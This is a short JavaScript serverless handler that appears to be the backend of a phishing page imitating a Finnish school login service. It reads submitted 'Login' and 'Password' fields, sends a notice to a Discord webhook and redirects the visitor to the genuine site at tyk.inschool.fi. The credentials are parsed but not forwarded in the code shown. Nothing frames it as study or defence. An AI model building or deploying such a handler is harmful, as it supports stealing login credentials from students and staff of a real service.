import querystring from 'querystring';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    res.status(405).end();
    return;
  }

  try {
    const chunks = [];
    for await (const chunk of req) chunks.push(chunk);
    const raw = Buffer.concat(chunks).toString('utf8');
    const data = querystring.parse(raw);

    const username = (data.Login || '').toString().trim();
    const password = (data.Password || '').toString();

    const webhook = process.env.DISCORD_WEBHOOK_URL;
    if (webhook) {
      try {
        await fetch(webhook, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content: 'Login form submitted' }),
        });
      } catch (_) {
      }
    }

    res.status(303);
    res.setHeader('Location', 'https://tyk.inschool.fi');
    res.end();
  } catch (e) {
    res.status(500).end();
  }
}
